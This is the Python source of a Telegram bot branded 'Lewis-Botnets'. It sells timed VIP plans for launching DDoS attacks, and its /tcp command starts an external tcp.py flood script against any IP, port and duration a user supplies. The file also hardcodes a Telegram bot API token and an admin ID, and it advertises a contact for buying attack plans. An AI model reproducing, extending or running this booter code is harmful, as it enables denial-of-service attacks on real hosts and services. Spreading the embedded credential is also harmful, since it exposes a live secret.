import telebot
import subprocess
import json
from datetime import datetime, timedelta

API_TOKEN = '7063308249:AAFg6sRLach6JLxUmq9WfS6H6GJyaW7yPXo'
bot = telebot.TeleBot(API_TOKEN)
ADMIN_IDS = [6726028567]
VIP_FILE = 'vip.json'

def load_vip_data():
    try:
        with open(VIP_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_vip_data(data):
    with open(VIP_FILE, 'w') as f:
        json.dump(data, f, indent=4)

@bot.message_handler(commands=['menu'])
def handle_start(message):
    bot.reply_to(message, """
Hello, Welcome To Lewis-Botnets!
Commands For Bot:
/plan: View Account Plan
/tcp: Attack TCP Legit Methods
Admin Commands:
/add: Add Plan To User ID
/delete: Delete Plan To User ID
    """)

@bot.message_handler(commands=['plan'])
def handle_plan(message):
    vip_data = load_vip_data()
    user_id = str(message.from_user.id)
    username = message.from_user.username

    if user_id in vip_data:
        user_vip_status = "TRUE"
        user_power = "VIP"
        max_time = vip_data[user_id].get('max_time', 30)
        cooldown = "30s"
    elif message.from_user.id in ADMIN_IDS:
        user_vip_status = "TRUE"
        user_power = "ADMIN"
        max_time = "300s"
        cooldown = "10s"
    else:
        user_vip_status = "FALSE"
        user_power = "FALSE"
        max_time = "30s"
        cooldown = "NOPE"

    bot.reply_to(message, f"""
Username: @{username}
Vip Plan: {user_vip_status}
Blacklist: FALSE
User Power: {user_power}
MaxTime: {max_time}
Cooldown: {cooldown}
    """)

@bot.message_handler(commands=['add'])
def handle_add(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "You Do Not Have Permission To Use This Command.")
        return

    try:
        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "Usage: /add <ID> <MaxTime> <Days>")
            return

        user_id = command[1]
        max_time = int(command[2])
        days = int(command[3])

        vip_data = load_vip_data()
        vip_data[user_id] = {
            'max_time': max_time,
            'expires_at': (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
        }
        save_vip_data(vip_data)

        bot.reply_to(message, f"User {user_id} ADD VIP | MaxTime: [{max_time}s] | Expiry: [{days}] Day(s)")
    except Exception as e:
        bot.reply_to(message, f"Error")

@bot.message_handler(commands=['delete'])
def handle_delete(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "You Do Not Have Permission To Use This Command.")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            bot.reply_to(message, "Usage: /delete <ID>")
            return

        user_id = command[1]
        vip_data = load_vip_data()

        if user_id in vip_data:
            del vip_data[user_id]
            save_vip_data(vip_data)
            bot.reply_to(message, f"User {user_id} Has Been Removed From VIP.")
        else:
            bot.reply_to(message, f"User {user_id} Has Not In The VIP List.")
    except Exception as e:
        bot.reply_to(message, f"Error")

@bot.message_handler(commands=['tcp'])
def handle_tcp(message):
    vip_data = load_vip_data()
    user_id = str(message.from_user.id)
    
    if message.from_user.id not in ADMIN_IDS and user_id not in vip_data:
        bot.reply_to(message, "You Do Not Have Permission To Use This Command\nYou Can Text [@HenryNET206] To Get Plan")
        return

    try:
        command = message.text.split()
        
        if len(command) != 4:
            bot.reply_to(message, "Usage: /tcp IP PORT TIME")
            return
        
        ip = command[1]
        port = command[2]
        time = int(command[3])

        if user_id in vip_data:
            max_time = vip_data[user_id].get('max_time', 30)
        elif message.from_user.id in ADMIN_IDS:
            max_time = 300
        else:
            max_time = 30

        if time > max_time:
            bot.reply_to(message, f"Max allowed time is {max_time} seconds.")
            return

        subprocess.Popen(['python', 'tcp.py', ip, port, str(time)])

        bot.reply_to(message, f"You Have Successfully Attacked!\nHost: {ip}\nPort: {port}\nTime: {time} Seconds\nPower: @HenryNET206")

    except Exception as e:
        bot.reply_to(message, f"Botnet Server API Error!")

bot.polling()
